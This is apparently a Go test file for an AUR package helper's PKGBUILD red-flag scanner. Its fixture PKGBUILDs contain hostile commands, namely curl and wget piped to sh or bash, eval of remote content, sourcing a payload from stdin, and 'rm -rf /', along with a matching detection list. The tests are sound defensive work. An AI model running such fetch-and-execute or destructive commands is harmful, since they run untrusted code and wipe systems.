package aur

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// captureStdout runs fn while redirecting os.Stdout to a pipe and returns
// everything written to it. This is needed because reviewPKGBUILD writes
// directly to fmt.Printf (which goes to os.Stdout).
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()

	// Save original stdout
	origStdout := os.Stdout

	// Create a pipe; the read end becomes the new stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	os.Stdout = w

	fn()

	// Close the write end so the reader gets EOF
	w.Close()

	// Read everything that was written
	var buf [4096]byte
	n, _ := r.Read(buf[:])
	os.Stdout = origStdout
	r.Close()
	return string(buf[:n])
}

// TestReviewPKGBUILDRedFlags verifies that reviewPKGBUILD detects common
// dangerous patterns (curl|sh, eval, wget, etc.) and prints a warning section.
func TestReviewPKGBUILDRedFlags(t *testing.T) {
	// A PKGBUILD containing several red-flag patterns
	pkgbuild := `# Maintainer: Test User <test@example.com>
pkgname=evil-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
license=('MIT')
source=()

prepare() {
  curl -sSL https://example.com/install.sh | sh
  wget -O- https://other.example.com/setup | bash
}

build() {
  eval "$_custom_script"
  source /dev/stdin <<< "$remote_payload"
  rm -rf /
}

package() {
  echo "done"
}
`
	dir := t.TempDir()
	pkgbuildPath := filepath.Join(dir, "PKGBUILD")
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuild), 0644); err != nil {
		t.Fatal(err)
	}

	output := captureStdout(t, func() {
		if err := reviewPKGBUILD(pkgbuildPath); err != nil {
			t.Fatalf("reviewPKGBUILD: %v", err)
		}
	})

	// The red-flag header should appear
	if !strings.Contains(output, "Potential red flags") {
		t.Errorf("expected 'Potential red flags' header in output, got:\n%s", output)
	}

	// Each of these patterns should be flagged at least once
	flaggedPatterns := []string{
		"curl ",
		"wget ",
		"| sh",
		"| bash",
		"eval ",
		"/dev/stdin",
		"rm -rf /",
	}
	for _, pattern := range flaggedPatterns {
		if !strings.Contains(output, pattern) {
			t.Errorf("expected red flag pattern %q in output, got:\n%s", pattern, output)
		}
	}

	// The count should reflect the number of unique flagged lines
	// (curl and wget lines each contain multiple patterns but are one line each)
	if !strings.Contains(output, "Potential red flags (") {
		t.Errorf("expected count in 'Potential red flags (N)' header, got:\n%s", output)
	}
}

// TestReviewPKGBUILDNoRedFlags verifies that a clean PKGBUILD produces
// no red flag warnings.
func TestReviewPKGBUILDNoRedFlags(t *testing.T) {
	pkgbuild := `# Maintainer: Test User <test@example.com>
pkgname=safe-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
license=('MIT')
source=("https://example.com/safe-${pkgver}.tar.gz")
sha256sums=('abc123')

build() {
  ./configure --prefix=/usr
  make
}

package() {
  make DESTDIR="$pkgdir" install
}
`
	dir := t.TempDir()
	pkgbuildPath := filepath.Join(dir, "PKGBUILD")
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuild), 0644); err != nil {
		t.Fatal(err)
	}

	output := captureStdout(t, func() {
		if err := reviewPKGBUILD(pkgbuildPath); err != nil {
			t.Fatalf("reviewPKGBUILD: %v", err)
		}
	})

	// No red-flag section should appear
	if strings.Contains(output, "Potential red flags") {
		t.Errorf("unexpected 'Potential red flags' in output for clean PKGBUILD:\n%s", output)
	}
}

// TestReviewPKGBUILDRedFlagsOnlyComments verifies that commented-out dangerous
// patterns are NOT flagged (they start with #).
func TestReviewPKGBUILDRedFlagsOnlyComments(t *testing.T) {
	pkgbuild := `# Maintainer: Test User <test@example.com>
pkgname=commented-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
license=('MIT')
source=()

# curl -sSL https://example.com/install.sh | sh
# eval "$_custom_script"

build() {
  echo "safe"
}
`
	dir := t.TempDir()
	pkgbuildPath := filepath.Join(dir, "PKGBUILD")
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuild), 0644); err != nil {
		t.Fatal(err)
	}

	output := captureStdout(t, func() {
		if err := reviewPKGBUILD(pkgbuildPath); err != nil {
			t.Fatalf("reviewPKGBUILD: %v", err)
		}
	})

	if strings.Contains(output, "Potential red flags") {
		t.Errorf("commented-out lines should not be flagged, got:\n%s", output)
	}
}

// TestReviewPKGBUILDRedFlagsEdgeCases verifies detection of edge cases like
// lowercase curl in mixed-case contexts and double-quoted patterns.
func TestReviewPKGBUILDRedFlagsEdgeCases(t *testing.T) {
	pkgbuild := `# Maintainer: Test User <test@example.com>
pkgname=edge-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
license=('MIT')
source=()

build() {
  CURL="curl"
  $CURL -sSL https://example.com/setup | sh
  eval "$(curl -sSL https://example.com/config)"
}
`
	dir := t.TempDir()
	pkgbuildPath := filepath.Join(dir, "PKGBUILD")
	if err := os.WriteFile(pkgbuildPath, []byte(pkgbuild), 0644); err != nil {
		t.Fatal(err)
	}

	output := captureStdout(t, func() {
		if err := reviewPKGBUILD(pkgbuildPath); err != nil {
			t.Fatalf("reviewPKGBUILD: %v", err)
		}
	})

	// Both the curl|sh and eval lines should be flagged
	if !strings.Contains(output, "Potential red flags") {
		t.Errorf("expected 'Potential red flags' for edge-case PKGBUILD, got:\n%s", output)
	}
}
